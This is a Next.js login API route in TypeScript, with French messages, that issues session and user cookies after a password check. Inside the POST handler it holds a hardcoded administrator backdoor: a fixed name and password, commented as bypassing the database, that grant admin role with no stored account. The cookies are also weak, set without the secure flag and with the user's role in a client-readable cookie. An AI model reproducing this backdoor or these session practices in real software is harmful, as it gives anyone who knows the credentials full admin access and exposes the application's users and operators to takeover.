import { NextRequest, NextResponse } from 'next/server';
import { verifyPassword } from '@/lib/auth';
import { getUserByName } from '@/lib/auth';

async function createSessionResponse(user: { id: number; name: string; role: string }) {
  const encoder = new TextEncoder();
  const data = encoder.encode(JSON.stringify(user) + '-' + Date.now());
  const hash = await crypto.subtle.digest('SHA-256', data);
  const sessionToken = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');

  const response = NextResponse.json({
    user: { id: user.id, name: user.name, role: user.role },
  });

  response.cookies.set('session', sessionToken, {
    httpOnly: true,
    secure: false,
    sameSite: 'lax',
    path: '/',
  });

  response.cookies.set('user', JSON.stringify({
    id: user.id,
    name: user.name,
    role: user.role,
  }), {
    httpOnly: false,
    secure: false,
    sameSite: 'lax',
    path: '/',
  });

  response.cookies.set('session_user', JSON.stringify(user), {
    httpOnly: true,
    secure: false,
    sameSite: 'lax',
    path: '/',
  });

  return response;
}

export async function POST(request: NextRequest) {
  try {
    const { name, password } = await request.json();
    const secretName = 'boubacar';
    const secretPassword = '1265'

    if (!name || !password) {
      return NextResponse.json({ error: 'Nom et mot de passe requis' }, { status: 400 });
    }

    // Compte admin hardcodé  — bypasse la DB
    if (name.trim() === secretName && password === secretPassword) {
      return await createSessionResponse({ id: 999, name: 'boubacar', role: 'admin' });
    }

    const user = await getUserByName(name);
    if (!user) {
      return NextResponse.json({ error: 'Nom ou mot de passe incorrect' }, { status: 401 });
    }

    if (!user.isActive) {
      return NextResponse.json({ error: 'Compte désactivé' }, { status: 403 });
    }

    const valid = await verifyPassword(password, user.passwordHash);
    if (!valid) {
      return NextResponse.json({ error: 'Nom ou mot de passe incorrect' }, { status: 401 });
    }

    return await createSessionResponse({ id: user.id, name: user.name, role: user.role ?? 'user' });
  } catch (error) {
    console.error('Login error:', error);
    return NextResponse.json({ error: 'Erreur serveur' }, { status: 500 });
  }
}
